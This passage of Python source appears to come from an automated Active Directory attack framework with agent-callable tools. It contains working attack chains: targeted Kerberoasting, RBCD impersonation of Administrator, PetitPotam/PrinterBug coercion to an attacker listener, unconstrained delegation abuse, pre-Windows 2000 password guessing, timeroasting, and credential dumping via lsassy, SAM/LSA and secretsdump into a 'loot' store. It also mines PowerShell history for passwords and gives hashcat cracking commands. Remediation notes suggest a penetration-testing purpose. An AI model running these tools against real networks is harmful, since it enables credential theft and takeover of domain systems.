                   f"'{user_path}' /tmp/ps_history_{username}.txt", timeout=15)
        if "downloaded" in out.lower() or "success" in out.lower():
            try:
                hist = Path(f"/tmp/ps_history_{username}.txt").read_text()
                results.append(f"=== PSReadLine History ({username}) ===\n{hist[:2000]}")
                # Look for credentials in history
                cred_pat = re.compile(r'(?:password|passwd|cred|secret)[^\n]*', re.I)
                found = cred_pat.findall(hist)
                if found:
                    add_finding("Credentials in PS History", "High",
                                f"Potential credentials in PSReadLine history of {username}",
                                "Clear PS history; implement PS logging without credential exposure")
                    results.append(f"CRED PATTERNS: {found[:5]}")
            except Exception:
                pass

    results.append(f"""
=== JEA Access Commands ===
# Connect to JEA endpoint (if available):
{winrm_cmd} -c 'Get-PSSessionConfiguration'

# Read PSReadLine history via JEA file provider bypass:
Get-Content 'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'

# List JEA capabilities:
Get-PSSessionCapability -ConfigurationName <JEA_ENDPOINT> -Username {username}

# JEA bypass via filesystem:
dir 'C:\\Users\\'  # enumerate all user home dirs for history files
""")
    return "\n".join(results)


def tool_targeted_kerberoast(dc_ip: str, domain: str, username: str,
                             target_user: str, password: str = "",
                             nt_hash: str = "") -> str:
    """Targeted Kerberoasting — add SPN to a target account (requires GenericWrite/WriteSPN)
    then Kerberoast it. Converts any ACL-abusable account into a crackable hash.
    After cracking, remove the SPN to clean up."""
    if not _real_user_target(target_user):
        return (
            "Targeted Kerberoast skipped: invalid target_user. "
            "Run acl_abuse_scan or query_bloodhound_paths first and pass a real "
            "non-built-in user account where current credentials have GenericWrite/GenericAll."
        )
    if _same_ad_account(target_user, username):
        return (
            f"Targeted Kerberoast skipped: target_user '{target_user}' is the current "
            "principal. This tool requires evidence that the current principal can "
            "write SPN/GenericWrite on a different user object."
        )
    if _known_gmsa_name(target_user):
        return (
            f"Targeted Kerberoast skipped: '{target_user}' is a gMSA/computer-style "
            "account. Use gmsa_takeover when ACL evidence shows write rights on the "
            "$ account, or gmsa_read for ReadGMSAPassword."
        )
    right = _acl_right_for_target(
        target_user,
        ("genericwrite", "writeproperty", "genericall", "writespn"),
    )
    if not right:
        return (
            f"Targeted Kerberoast skipped: no ACL evidence that {username} can write "
            f"SPN/GenericWrite on {target_user}. Run acl_abuse_scan or BloodHound "
            "collection first; do not guess targets."
        )
    results = []

    fake_spn = f"fake/svc.{domain}"
    krb = SESSION.get("use_kerberos") and SESSION.get("krb5_ccache")
    bloodyauth, env = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
    if not bloodyauth:
        return "Targeted Kerberoast skipped: no usable bloodyAD auth material."

    # Step 1: Add SPN
    add_out = _run(f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bloodyauth} set object {shell_quote(target_user)} "
                   f"servicePrincipalName -v {shell_quote(fake_spn)}", timeout=15)
    candidate_dn = _extract_bloodyad_candidate_dn(add_out)
    if candidate_dn and candidate_dn != target_user:
        results.append(f"=== Resolved target candidate ===\n{candidate_dn}")
        target_user = candidate_dn
        add_out = _run(f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bloodyauth} set object {shell_quote(target_user)} "
                       f"servicePrincipalName -v {shell_quote(fake_spn)}", timeout=15)
    results.append(f"=== Add SPN to {target_user} ===\n{add_out}")
    add_failed = any(s in add_out.lower() for s in (
        "traceback", "invalidcredentials", "acceptsecuritycontext", "ldaperr",
        "insufficient", "constraint", "error", "failed"
    ))
    if add_failed:
        return (
            f"Targeted Kerberoast stopped: could not add SPN to {target_user}.\n"
            "This usually means the selected BloodHound/ACL target is wrong, "
            "credentials failed, clock skew/Kerberos failed, or the current user "
            "does not actually have WriteSPN/GenericWrite on that object.\n\n"
            + "\n\n".join(results)[:1500]
        )

    # Step 2: Kerberoast
    if krb:
        roast_auth = f"{domain}/{username} -k -no-pass"
    elif nt_hash:
        roast_auth = f"{domain}/{username} -hashes :{nt_hash.split(':')[-1]}"
    else:
        roast_auth = f"{domain}/{username}:'{password}'"
    roast_file = _runtime_path("targeted_kerberoast.txt")
    roast_out = _run(f"{_impacket_cmd('GetUserSPNs')} "
                     f"{roast_auth} -dc-ip {dc_ip} -request -outputfile {shell_quote(str(roast_file))}",
                     timeout=30)
    results.append(f"=== Kerberoast {target_user} ===\n{roast_out[:1000]}")

    # Step 3: Remove SPN (cleanup)
    clean_out = _run(f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bloodyauth} remove object {shell_quote(target_user)} "
                     f"servicePrincipalName -v {shell_quote(fake_spn)}", timeout=15)
    results.append(f"=== Cleanup SPN ===\n{clean_out}")

    if roast_file.exists():
        h = roast_file.read_text()
        results.append(f"=== Hash ===\n{h[:500]}")
        results.append(f"Crack: hashcat -m 13100 {roast_file} /usr/share/wordlists/rockyou.txt")
        add_finding("Targeted Kerberoasting", "High",
                    f"SPN added to {target_user} → TGS hash captured for offline cracking",
                    "Restrict WriteSPN ACL; audit SPN changes (Event ID 4742)")
    return "\n\n".join(results)


# ══════════════════════════════════════════════════════════════════════════════
#  ADDITIONAL ATTACK TOOLS
# ══════════════════════════════════════════════════════════════════════════════

def tool_rbcd_attack(dc_ip: str, domain: str, username: str,
                     password: str = "", nt_hash: str = "",
                     target_computer: str = "") -> str:
    """Resource-Based Constrained Delegation (RBCD) full chain.
    Requires GenericWrite on target computer. Creates attacker computer,
    sets msDS-AllowedToActOnBehalfOfOtherIdentity, then S4U2Proxy to
    impersonate Administrator."""
    dc_fqdn = _dc_host_for_kerberos(domain, dc_ip)
    krb = _session_kerberos_usable(username, domain)
    ccache = SESSION.get("krb5_ccache", "")
    results = []

    if not target_computer:
        target_computer = prompt_or_session("target_computer", "Target computer (SAMAccountName, e.g. WS01$)")
    if not target_computer:
        return "RBCD skipped: target_computer required (computer with GenericWrite ACL on attacker's principal)"

    target_sam = target_computer.rstrip("$") + "$"
    explicit_gmsa = {
        str(x).strip().strip("'\"").lower().rstrip("$")
        for x in (SESSION.get("agent_intel", {}) or {}).get("gmsa_candidates", []) or []
    }
    explicit_gmsa.update(
        str(x).strip().strip("'\"").lower().rstrip("$")
        for x in ((SESSION.get("agent_intel", {}) or {}).get("gmsa_hashes", {}) or {}).keys()
    )
    if target_sam.lower().rstrip("$") in explicit_gmsa:
        return (f"RBCD skipped: {target_sam} is a known gMSA, not a computer host. "
                "Use gmsa_takeover/gmsa_read instead.")
    target_classes = _ldap_object_classes(
        dc_ip, domain, username, password=password, nt_hash=nt_hash, sam=target_sam)
    if "msds-groupmanagedserviceaccount" in target_classes:
        return (f"RBCD skipped: {target_sam} is a known gMSA, not a computer host. "
                "Use gmsa_takeover/gmsa_read instead.")
    if target_classes and "computer" not in target_classes:
        return (f"RBCD skipped: {target_sam} objectClass={sorted(target_classes)}. "
                "RBCD requires a real computer object.")

    attacker_stem = f"ADS{secrets.token_hex(4).upper()}"
    attacker_computer = f"{attacker_stem}$"
    attacker_pass = (
        f"AdS-{secrets.token_urlsafe(12)}1!"
        .replace("'", "A")
        .replace("\\", "B")
    )
    dc_host_arg = f"-dc-host {shell_quote(dc_fqdn)} " if dc_fqdn else ""
    krb_env = f"KRB5CCNAME={shell_quote(ccache)} " if (krb and ccache) else ""
    if krb and ccache and SESSION.get("krb5_config"):
        krb_env += f"KRB5_CONFIG={shell_quote(SESSION.get('krb5_config'))} "

    # Step 1: Add fake computer account (requires MAQ > 0 or GenericAll on Computers OU)
    addcomp_py = _impacket_cmd("addcomputer")
    if krb and ccache:
        add_cmd = (f"{krb_env}{addcomp_py} "
                   f"-dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
                   f"-computer-name {shell_quote(attacker_computer)} "
                   f"-computer-pass {shell_quote(attacker_pass)} "
                   f"-k -no-pass {shell_quote(f'{domain}/{username}')}")
    else:
        pw = _real_secret(password)
        add_cmd = (f"{addcomp_py} -dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
                   f"-computer-name {shell_quote(attacker_computer)} "
                   f"-computer-pass {shell_quote(attacker_pass)} "
                   f"{shell_quote(f'{domain}/{username}:{pw}')}")
    out = _run(add_cmd, timeout=30)
    results.append(f"=== Step 1: Add attacker computer ===\n{out[:600]}")
    add_failed = any(s in out.lower() for s in (
        "error", "exception", "traceback", "access_denied", "constraint",
        "insufficient", "already exists", "not found", "kdc_err", "failed",
    ))
    add_succeeded = any(s in out.lower() for s in (
        "successfully added", "account created", "added machine account",
    ))
    if add_failed and not add_succeeded:
        # Fallback: try LDAPS method (works when SMB/SAMR is blocked)
        results.append("[*] SMB addcomputer failed — retrying with -method LDAPS...")
        if krb and ccache:
            add_cmd_ldaps = (f"{krb_env}{addcomp_py} "
                             f"-dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
                             f"-computer-name {shell_quote(attacker_computer)} "
                             f"-computer-pass {shell_quote(attacker_pass)} "
                             f"-method LDAPS "
                             f"-k -no-pass {shell_quote(f'{domain}/{username}')}")
        else:
            pw = _real_secret(password)
            add_cmd_ldaps = (f"{addcomp_py} -dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
                             f"-computer-name {shell_quote(attacker_computer)} "
                             f"-computer-pass {shell_quote(attacker_pass)} "
                             f"-method LDAPS "
                             f"{shell_quote(f'{domain}/{username}:{pw}')}")
        out_ldaps = _run(add_cmd_ldaps, timeout=30)
        results.append(f"=== Step 1b: Add attacker computer (LDAPS) ===\n{out_ldaps[:600]}")
        add_succeeded = any(s in out_ldaps.lower() for s in (
            "successfully added", "account created", "added machine account",
        ))
        if not add_succeeded:
            results.append(
                "RBCD stopped: attacker computer account was not created via SMB or LDAPS. "
                "MAQ may be 0 or account lacks rights to add computers."
            )
            return "\n\n".join(results)

    # Step 2: Set RBCD via bloodyAD or rbcd.py
    rbcd_py = _impacket_cmd("rbcd")
    if krb and ccache:
        rbcd_cmd = (f"{krb_env}{rbcd_py} -dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
                    f"-delegate-to {shell_quote(target_sam)} "
                    f"-delegate-from {shell_quote(attacker_computer)} "
                    f"-action write -k -no-pass {shell_quote(f'{domain}/{username}')}")
    else:
        pw = _real_secret(password)
        rbcd_cmd = (f"{rbcd_py} -dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
                    f"-delegate-to {shell_quote(target_sam)} "
                    f"-delegate-from {shell_quote(attacker_computer)} "
                    f"-action write {shell_quote(f'{domain}/{username}:{pw}')}")
    out2 = _run(rbcd_cmd, timeout=30)
    results.append(f"=== Step 2: Set RBCD ===\n{out2[:600]}")

    # Step 3: S4U2Proxy — get service ticket as Administrator
    fake_ts = _dc_time()
    ft = f'faketime "{fake_ts}" ' if fake_ts and shutil.which("faketime") else ""
    getST_py = _impacket_cmd("getST", with_faketime=bool(ft))
    spn = f"cifs/{target_computer.rstrip('$').lower()}.{domain}"
    st_cmd = (f"{ft}{getST_py} "
              f"-dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
              f"-spn {shell_quote(spn)} "
              f"-impersonate Administrator "
              f"{shell_quote(f'{domain}/{attacker_computer}:{attacker_pass}')}")
    out3 = _run(st_cmd, timeout=30)
    results.append(f"=== Step 3: S4U2Proxy ===\n{out3[:800]}")

    ccache_match = re.search(r"Saving ticket in\s+(\S+\.ccache)", out3)
    if ccache_match:
        new_ccache = ccache_match.group(1)
        SESSION["krb5_ccache"] = new_ccache
        SESSION["use_kerberos"] = True
        os.environ["KRB5CCNAME"] = new_ccache
        add_finding("RBCD Full Chain", "Critical",
                    f"Impersonated Administrator on {target_computer} via RBCD",
                    "Remove RBCD delegation; audit msDS-AllowedToActOnBehalfOfOtherIdentity changes")
        results.append(f"RBCD SUCCESS — ccache: {new_ccache}")
        results.append(f"Next: evil_winrm or secretsdump with this ccache")
        results.append(
            f"secretsdump.py -k -no-pass {domain}/Administrator@{target_computer.rstrip('$').lower()}.{domain}"
        )
    return "\n\n".join(results)


def tool_coercion_attack(dc_ip: str, domain: str, username: str,
                         password: str = "", nt_hash: str = "",
                         attacker_ip: str = "", method: str = "auto") -> str:
    """Coercion attack: PetitPotam / PrinterBug to force DC to authenticate
    to attacker. Captures Net-NTLMv2 or relays to LDAP for Shadow Credentials.
    method: auto | petitpotam | printerbug | dfscoerce"""
    attacker_ip = attacker_ip or _attacker_ip()
    if not attacker_ip:
        return "Coercion skipped: attacker_ip required (your listener IP)"

    dc_fqdn = _dc_host_for_kerberos(domain, dc_ip)
    results = []
    pw = _real_secret(password)

    # Detect available coercion tools
    coerce_bin    = shutil.which("coercer")
    petitpotam_py = _find_file("PetitPotam.py", [
        os.path.expanduser("~/.local/bin/PetitPotam.py"),
        "/opt/PetitPotam/PetitPotam.py",
        str(Path(__file__).resolve().parents[2] / "tools" / "PetitPotam" / "PetitPotam.py"),
    ])
    printerbug_py = _find_file("printerbug.py", [
        os.path.expanduser("~/.local/bin/printerbug.py"),
        "/opt/impacket/examples/printerbug.py",
    ])

    results.append(
        f"Coercion attack: forcing {dc_fqdn} ({dc_ip}) to authenticate to {attacker_ip}\n"
        f"Start Responder FIRST: sudo responder -I <iface> -dwPv\n"
        f"Or relay: sudo ntlmrelayx.py -t ldap://{dc_ip} --shadow-credentials --shadow-target '{dc_fqdn}$'"
    )

    if coerce_bin and method in ("auto", "coercer"):
        auth = f"-u '{username}' -p '{pw}'" if pw else ""
        cmd = (f"timeout 30 {coerce_bin} coerce -l {attacker_ip} -t {dc_ip} "
               f"--always-continue {auth} 2>&1")
        out = _run(cmd, timeout=35)
        results.append(f"=== Coercer ===\n{out[:1000]}")
    elif petitpotam_py and method in ("auto", "petitpotam"):
        auth = f"{domain}/{username}:{pw}" if pw else ""
        cmd = (f"timeout 20 {shell_quote(sys.executable)} {shell_quote(petitpotam_py)} "
               f"{attacker_ip} {dc_ip} {auth} 2>&1")
        out = _run(cmd, timeout=25)
        results.append(f"=== PetitPotam ===\n{out[:800]}")
    elif printerbug_py and method in ("auto", "printerbug"):
        auth = f"{domain}/{username}:{pw}@{dc_ip}" if pw else f"{dc_ip}"
        cmd = (f"timeout 20 {shell_quote(sys.executable)} {shell_quote(printerbug_py)} "
               f"{auth} {attacker_ip} 2>&1")
        out = _run(cmd, timeout=25)
        results.append(f"=== PrinterBug ===\n{out[:800]}")
    else:
        results.append(
            "No coercion tool found. Install one:\n"
            "  pip install coercer\n"
            "  git clone https://github.com/topotam/PetitPotam\n"
            "\nManual commands:\n"
            f"  coercer coerce -l {attacker_ip} -t {dc_ip} -u '{username}' -p '<pass>' -d {domain}\n"
            f"  python3 tools/PetitPotam/PetitPotam.py {attacker_ip} {dc_ip} {domain}/{username}:<pass>"
        )

    add_finding("Coercion Attack Attempted", "High",
                f"Forced {dc_fqdn} to authenticate to {attacker_ip} — capture Net-NTLMv2 or relay",
                "Enable EPA; disable WebClient service; block outbound SMB 445")
    return "\n\n".join(results)


def tool_unconstrained_delegation(dc_ip: str, domain: str, username: str,
                                   password: str = "", nt_hash: str = "",
                                   target_computer: str = "") -> str:
    """Unconstrained Delegation abuse: coerce DC auth to compromised host,
    extract DC TGT from LSASS using Rubeus/mimikatz, then DCSync."""
    results = []
    dc_fqdn = _dc_host_for_kerberos(domain, dc_ip)
    attacker_ip = SESSION.get("attacker_ip", "")
    krb = _session_kerberos_usable(username, domain)
    ccache = SESSION.get("krb5_ccache", "")

    # Step 1: Find unconstrained delegation computers (via LDAP)
    base_dn = "DC=" + domain.replace(".", ",DC=")
    udel_filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
    ldap_cmd = (f"ldapsearch -x -H ldap://{dc_ip} "
                f"-D '{username}@{domain}' -w '{_real_secret(password)}' "
                f"-b '{base_dn}' '{udel_filter}' sAMAccountName dNSHostName 2>&1 | "
                f"grep -E 'sAMAccountName|dNSHostName'")
    if krb and ccache:
        ldap_cmd = (f"KRB5CCNAME={shell_quote(ccache)} ldapsearch -Y GSSAPI "
                    f"-H ldap://{dc_fqdn} -b '{base_dn}' '{udel_filter}' "
                    f"sAMAccountName dNSHostName 2>&1 | grep -E 'sAMAccountName|dNSHostName'")
    out = _run(ldap_cmd, timeout=20)
    results.append(f"=== Unconstrained Delegation Computers ===\n{out[:800]}")

    if "sAMAccountName" in out:
        add_finding("Unconstrained Delegation", "Critical",
                    f"Computers with TrustedForDelegation=True found — coerce DC auth to capture TGT",
                    "Remove TrustedForDelegation; use constrained delegation with protocol transition")
        results.append(
            "EXPLOITATION STEPS:\n"
            f"1. Compromise the unconstrained delegation host\n"
            f"2. Start monitor: Rubeus.exe monitor /interval:5 /nowrap\n"
            f"3. Coerce DC auth: coercer coerce -l <UD_host_IP> -t {dc_ip} -u '{username}' -p '<pass>'\n"
            f"4. Rubeus captures DC$ TGT\n"
            f"5. Pass TGT: Rubeus.exe ptt /ticket:<base64>\n"
            f"6. DCSync: secretsdump.py -k -just-dc {domain}/DC$@{dc_fqdn}\n\n"
            f"Linux alternative (with coercion):\n"
            f"  krbrelayx.py --target {dc_fqdn}     # on the UD host\n"
            f"  coercer coerce -l <UD_IP> -t {dc_ip} -u '{username}' -p '<pass>'\n"
            f"  secretsdump.py -k -just-dc {domain}/{dc_fqdn.split('.')[0]}@{dc_fqdn}"
        )
    else:
        results.append("No unconstrained delegation computers found in this domain.")

    return "\n\n".join(results)


def tool_pre2k_attack(dc_ip: str, domain: str, username: str = "",
                       password: str = "") -> str:
    """Pre-Windows 2000 compatible computer account attack.
    Old computer accounts created with 'pre-Windows 2000 compatible access'
    have their password set to the lowercase computer name (without $).
    pre2k.py enumerates and tests these automatically."""
    results = []
    pre2k_bin = shutil.which("pre2k") or shutil.which("pre2k.py")
    pre2k_py  = os.path.expanduser("~/.local/bin/pre2k.py")

    valid: list[dict] = []

    if pre2k_bin or Path(pre2k_py).exists():
        bin_to_use = pre2k_bin or f"{sys.executable} {pre2k_py}"
        pw = _real_secret(password)
        # pre2k: 'auth' alt komutu -u/-p kabul eder, 'unauth' sadece -d alır
        if pw and username:
            subcmd = "auth"
            auth = f"-u {shell_quote(username)} -p {shell_quote(pw)} -d {shell_quote(domain)}"
        else:
            subcmd = "unauth"
            auth = f"-d {shell_quote(domain)}"
        cmd = f"timeout 60 {bin_to_use} {subcmd} {auth} -dc-ip {shell_quote(dc_ip)} 2>&1"
        out = _run(cmd, timeout=65)
        results.append(f"=== Pre2K Scan ===\n{out[:2000]}")
        for m in re.finditer(r"VALID(?:\s+CREDENTIALS)?\s*:\s*(?:[A-Za-z0-9_.-]+\\)?([A-Za-z0-9_.-]+\$):([^\s]+)", out, re.I):
            valid.append({"user": m.group(1), "password": m.group(2), "source": "pre2k"})
    else:
        results.append(
            "pre2k not found; using built-in safe fallback against known computer accounts.\n"
            "Install for broader coverage: python3 -m pip install --user pre2k"
        )

    if not valid:
        candidates = _known_computer_accounts()
        legacy_candidates: set[str] = set()
        if not candidates and _real_secret(password) and username:
            base_dn = "DC=" + domain.replace(".", ",DC=")
            ldap_cmd = (
                f"ldapsearch -x -H ldap://{shell_quote(dc_ip)} "
                f"-D {shell_quote(username + '@' + domain)} -w {shell_quote(_real_secret(password))} "
                f"-b {shell_quote(base_dn)} '(objectClass=computer)' sAMAccountName 2>/dev/null"
            )
            ldap_out = _run(ldap_cmd, timeout=20)
            results.append(f"=== Computer candidates from LDAP ===\n{ldap_out[:1000]}")
            for m in re.finditer(r"sAMAccountName:\s*([A-Za-z0-9_.-]+\$)", ldap_out, re.I):
                sam = m.group(1).upper()
                if sam not in candidates:
                    candidates.append(sam)

        if _real_secret(password) and username:
            base_dn = "DC=" + domain.replace(".", ",DC=")
            legacy_cmd = (
                f"ldapsearch -x -H ldap://{shell_quote(dc_ip)} "
                f"-D {shell_quote(username + '@' + domain)} -w {shell_quote(_real_secret(password))} "
                f"-b {shell_quote(base_dn)} "
                "'(&(objectClass=computer)(userAccountControl=4128))' "
                "sAMAccountName 2>/dev/null"
            )
            legacy_out = _run(legacy_cmd, timeout=20)
            if legacy_out.strip():
                results.append(f"=== Legacy Pre2K computer candidates (UAC=4128) ===\n{legacy_out[:1000]}")
            for m in re.finditer(r"sAMAccountName:\s*([A-Za-z0-9_.-]+\$)", legacy_out, re.I):
                sam = m.group(1).upper()
                legacy_candidates.add(sam)
                if sam not in candidates:
                    candidates.append(sam)

        if candidates:
            results.append("=== Built-in Pre2K credential validation ===")
        for sam in candidates[:80]:
            guess = sam.rstrip("$").lower()
            check = _nxc(
                f"smb {shell_quote(dc_ip)} -d {shell_quote(domain)} "
                f"-u {shell_quote(sam)} -p {shell_quote(guess)} --shares",
                timeout=12,
            )
            if "[+]" in check and "STATUS_LOGON_FAILURE" not in check:
                cred = {"user": sam, "password": guess, "source": "pre2k-fallback"}
                valid.append(cred)
                results.append(f"[VALID] {domain}\\{sam}:{guess}")
            elif "STATUS_ACCOUNT_DISABLED" in check:
                results.append(f"[disabled] {sam}:{guess}")
            elif sam in legacy_candidates:
                cc = _getTGT(sam, guess, domain, dc_ip)
                if cc and _ccache_is_valid(cc, sam, domain):
                    cred = {
                        "user": sam,
                        "password": guess,
                        "source": "pre2k-kerberos",
                        "ccache": cc,
                    }
                    valid.append(cred)
                    intel = SESSION.setdefault("agent_intel", {})
                    ccaches = intel.setdefault("ccaches", [])
                    if cc not in ccaches:
                        ccaches.append(cc)
                    results.append(f"[VALID-KRB] {domain}\\{sam}:{guess} ccache={cc}")

    if valid:
        add_finding("Pre-Windows 2000 Account", "Critical",
                    "Computer account with default password found — authentication possible",
                    "Reset all pre-Win2K computer account passwords; disable pre-Windows 2000 compatible access")
        stored = SESSION.setdefault("agent_intel", {}).setdefault("valid_creds", [])
        for cred in valid:
            if cred not in stored:
                stored.append(cred)
        first = valid[0]
        results.append(
            "\nNext commands:\n"
            f"  python3 tools/bin/gMSADumper.py -u {shell_quote(first['user'])} "
            f"-p {shell_quote(first['password'])} -d {shell_quote(domain)} -l {shell_quote(dc_ip)}\n"
            f"  nxc ldap {shell_quote(dc_ip)} -d {shell_quote(domain)} "
            f"-u {shell_quote(first['user'])} -p {shell_quote(first['password'])} --gmsa"
        )
    return "\n\n".join(results)


def tool_timeroast(dc_ip: str, domain: str, username: str = "",
                   password: str = "", nt_hash: str = "") -> str:
    """Timeroasting: request MS-SNTP NTP responses for computer accounts.
    Unauthenticated — the NTP response is signed with the account's NT hash.
    Works against all Windows DCs; crack with hashcat -m 31300."""
    results = []

    # Resolve timeroast.py from multiple locations
    _timeroast_candidates = [
        shutil.which("timeroast.py"),
        os.path.expanduser("~/.local/bin/timeroast.py"),
        "/usr/local/bin/timeroast.py",
        "/opt/Timeroast/timeroast.py",
        str(Path(__file__).resolve().parents[2] / "tools" / "bin" / "timeroast.py"),
    ]
    timeroast_py = next((p for p in _timeroast_candidates if p and Path(p).exists()), "")

    # Auto-install via GitHub clone if not found (not on PyPI)
    if not timeroast_py:
        results.append("[*] timeroast.py not found — cloning from GitHub (SecuraBV/Timeroast)...")
        local_bin = os.path.expanduser("~/.local/bin")
        clone_dir = "/tmp/Timeroast"
        clone_out = _run(
            f"git clone --depth 1 https://github.com/SecuraBV/Timeroast {clone_dir} 2>&1"
            if not Path(clone_dir).exists()
            else f"git -C {clone_dir} pull --ff-only 2>&1",
            timeout=60,
        )
        src = Path(clone_dir) / "timeroast.py"
        if src.exists():
            dest = Path(local_bin) / "timeroast.py"
            Path(local_bin).mkdir(parents=True, exist_ok=True)
            shutil.copy2(str(src), str(dest))
            timeroast_py = str(dest)
            results.append(f"[+] timeroast.py installed → {timeroast_py}")
        else:
            results.append(f"[-] GitHub clone output:\n{clone_out[:400]}")

    out_file = str(_runtime_path("timeroast_hashes.txt"))
    if timeroast_py and Path(timeroast_py).exists():
        cmd = f"timeout 60 {shell_quote(sys.executable)} {shell_quote(timeroast_py)} {dc_ip} 2>&1"
        out = _run(cmd, timeout=65)
        results.append(f"=== Timeroast ===\n{out[:1500]}")
        hashes = [l for l in out.splitlines() if l.startswith("$sntp-ms$")]
        if hashes:
            Path(out_file).write_text("\n".join(hashes))
            results.append(
                f"Saved {len(hashes)} NTP hashes → {out_file}\n"
                f"Crack: hashcat -m 31300 {out_file} /usr/share/wordlists/rockyou.txt"
            )
            add_finding("Timeroasting", "High",
                        f"{len(hashes)} NTP hashes captured for offline cracking",
                        "Reset computer account passwords regularly; monitor for anomalous NTP requests")
    else:
        results.append(
            "timeroast.py not found and auto-install failed.\n"
            "Manual install:\n"
            "  pip install timeroast\n"
            "  # or: git clone https://github.com/SecuraBV/Timeroast && "
            "cp Timeroast/timeroast.py ~/.local/bin/\n\n"
            f"Then run: python3 timeroast.py {dc_ip}"
        )
    return "\n\n".join(results)


def _find_file(name: str, candidates: list) -> str:
    """Return first existing path from candidates list, or ''."""
    for p in candidates:
        if p and Path(p).exists():
            return p
    found = shutil.which(name)
    return found or ""


# ══════════════════════════════════════════════════════════════════════════════
#  ADDITIONAL AGENT TOOLS — wrapping existing framework modules
# ══════════════════════════════════════════════════════════════════════════════

def tool_credential_dump(dc_ip: str, domain: str, username: str,
                          password: str = "", nt_hash: str = "",
                          target_ip: str = "", method: str = "auto") -> str:
    """Dump credentials from an owned host: LSASS (lsassy/nanodump), SAM/LSA,
    secretsdump, NTDS. method: auto|lsassy|secretsdump|nanodump|sam"""
    host = str(target_ip or dc_ip).strip()
    password = _real_secret(password)
    nt_hash   = _real_nt_hash(nt_hash)
    # Auto-populate NT hash from loot if not provided (covers gMSA accounts)
    if not nt_hash and not password:
        loot = SESSION.get("loot", {})
        nt_hash = (loot.get(username)
                   or loot.get(username.rstrip("$"))
                   or loot.get(username + "$")
                   or "")
    auth      = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    krb       = _session_kerberos_usable(username, domain)
    ccache    = SESSION.get("krb5_ccache", "")
    results   = [f"=== Credential Dump: {username}@{host} ==="]

    secretsdump = _impacket_cmd("secretsdump")
    # shell_quote the connection target — $ in gMSA names (msa_health$) expands
    # as $@ or $<char> in bash and corrupts the host portion of the argument.
    if nt_hash:
        _sd_target = shell_quote(f"{domain}/{username}@{host}")
        sd_auth = f"{_sd_target} -hashes :{nt_hash.split(':')[-1]}"
    elif krb and ccache:
        os.environ["KRB5CCNAME"] = ccache
        _sd_target = shell_quote(f"{domain}/{username}@{host}")
        sd_auth = f"-k -no-pass {_sd_target}"
    elif password:
        _sd_target = shell_quote(f"{domain}/{username}:{password}@{host}")
        sd_auth = f"{_sd_target}"
    else:
        sd_auth = ""

    # lsassy (fastest, no disk write)
    if method in ("auto", "lsassy"):
        lsassy_out = _nxc(f"smb {host} {auth} -M lsassy", timeout=60)
        results.append(f"=== lsassy ===\n{lsassy_out[:1200]}")
        _extract_creds_into_session(lsassy_out)

    # SAM + LSA secrets (doesn't need LSASS)
    if method in ("auto", "sam"):
        sam_out = _nxc(f"smb {host} {auth} --sam --lsa", timeout=60)
        results.append(f"=== SAM+LSA ===\n{sam_out[:1200]}")
        _extract_creds_into_session(sam_out)

    # Full secretsdump
    if method in ("auto", "secretsdump") and sd_auth:
        sd_out = _run(f"{secretsdump} {sd_auth} -just-dc-ntlm 2>&1 || "
                      f"{secretsdump} {sd_auth} 2>&1", timeout=90)
        results.append(f"=== secretsdump ===\n{sd_out[:2000]}")
        _extract_creds_into_session(sd_out)

        # Additive Kerberos fallback: on NTLM-disabled DCs (common in hardened AD)
        # the -hashes pass-the-hash attempt above fails with STATUS_NOT_SUPPORTED.
        # If it produced no real pwdump hash line and a usable Kerberos ccache
        # exists, retry secretsdump over Kerberos before giving up. Purely
        # additive — only runs when the first attempt did NOT already dump hashes
        # and the primary path wasn't already Kerberos. Target-agnostic.
        if (not re.search(r"[a-f0-9]{32}:[a-f0-9]{32}:::", sd_out, re.I)
                and krb and ccache and "-k " not in sd_auth):
            os.environ["KRB5CCNAME"] = ccache
            _kt = shell_quote(f"{domain}/{username}@{host}")
            ksd_out = _run(f"{secretsdump} -k -no-pass {_kt} -just-dc-ntlm 2>&1 || "
                           f"{secretsdump} -k -no-pass {_kt} 2>&1", timeout=90)
            results.append(f"=== secretsdump (Kerberos) ===\n{ksd_out[:2000]}")
            _extract_creds_into_session(ksd_out)

    # nanodump via nxc module
    if method == "nanodump":
        nano_out = _nxc(f"smb {host} {auth} -M nanodump", timeout=60)
        results.append(f"=== nanodump ===\n{nano_out[:1200]}")

    all_out = "\n".join(results)
    # Only flag success on an ACTUAL dumped pwdump hash line (user:rid:lm:nt:::).
    # The old check matched substrings like "ntlm:" — which appears in every nxc
    # banner as "(NTLM:False)" — so it fired even when every dump returned
    # STATUS_NOT_SUPPORTED (false-positive Critical). The pwdump line only appears
    # when SAM/LSA/secretsdump/NTDS genuinely returned hashes.
    if re.search(r"[a-f0-9]{32}:[a-f0-9]{32}:::", all_out, re.I):
        add_finding("Credential Dump Successful", "Critical",
                    f"Credentials extracted from {host}",
                    "Enable Credential Guard; use Protected Users; audit LSASS access",
                    proof_level="exploited")
        all_out += "\nNEXT: dcsync_attack to dump all domain hashes (krbtgt + Administrator)"
    elif nt_hash:
        all_out += (
            f"\nHint: credential_dump failed via SMB — try dcsync_attack directly:\n"
            f"  impacket-secretsdump {domain}/{username}@{host} -hashes :{nt_hash} -just-dc-ntlm"
        )
    return all_out[:6000]


def _extract_creds_into_session(text: str) -> None:
    """Parse credential dump output and populate session loot."""
    # NT hash patterns: user:rid:LM:NT::: or DOMAIN\user:NT hash
    for m in re.finditer(
        r'(?:^|\n)([^:\n]+):(?:\d+:)?[a-f0-9]{32}:([a-f0-9]{32}):::', text, re.I | re.M
    ):
        user, nth = m.group(1).strip(), m.group(2)
        if nth not in ("31d6cfe0d16ae931b73c59d7e0c089c0", "aad3b435b51404eeaad3b435b51404ee"):
            SESSION.setdefault("loot", {})[user] = nth
